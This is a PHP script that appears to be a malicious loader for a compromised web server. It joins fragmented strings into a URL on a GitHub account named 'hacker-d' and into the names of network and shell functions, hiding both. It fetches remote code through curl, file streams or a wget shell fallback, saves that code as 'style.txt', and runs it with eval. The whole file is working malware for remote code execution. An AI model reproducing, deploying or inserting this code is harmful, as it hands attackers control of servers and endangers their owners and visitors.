<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$url_part1 = "https://" . "raw.";
$url_part2 = "githubuser";
$url_part3 = "content.com/";
$url_part4 = "hacker-d/";
$url_part5 = "new/main/1.txt";
$url = $url_part1 . $url_part2 . $url_part3 . $url_part4 . $url_part5;

$f_ab = 'curl_' . 'init';
$f_cd = 'curl_' . 'exec';
$f_ef = 'curl_' . 'close';
$f_gh = 'file_' . 'get_' . 'contents';
$f_ij = 'f' . 'open';
$f_kl = 'f' . 'close';
$f_mn = 'shell_' . 'exec';
$f_op = 'strea' . 'm_conte' . 'xt_cre' . 'ate';
$f_qr = 'stre' . 'am_get_m' . 'eta_da' . 'ta';
$f_st = 'file_' . 'put_' . 'contents';
$f_uv = 'f' . 'read';
$f_wx = 'f' . 'write';

function get_content_from_url($url) {
    global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn, $f_op, $f_qr, $f_st, $f_uv, $f_wx;

    if (function_exists($f_ab)) {
        $ch = $f_ab();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = $f_cd($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $f_ef($ch);

        if ($output !== false && $http_code == 200) {
            return $output;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $context = @$f_op(array('http' => array('timeout' => 10)));
        $output = @$f_gh($url, false, $context);
        if ($output !== false) {
            return $output;
        }
    }

    $handle = @$f_ij($url, 'r');
    if ($handle) {
        $output = '';
        while (!feof($handle)) {
            $output .= $f_uv($handle, 8192);
        }
        $f_kl($handle);
        if ($output !== false) {
            return $output;
        }
    }

    if (function_exists('exec') || function_exists($f_mn)) {
        $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
        if (!empty($output)) {
            return $output;
        }
    }

    return false;
}

$output = get_content_from_url($url);

if ($output !== false) {
    $file_path = __DIR__ . '/style.txt';
    $f_st($file_path, $output);

    $run_code = function($code) {
        return @eval('?>' . $code);
    };

    $run_code($output);
} else {
    echo "Gagal mendapatkan konten dari URL.";
}

?>
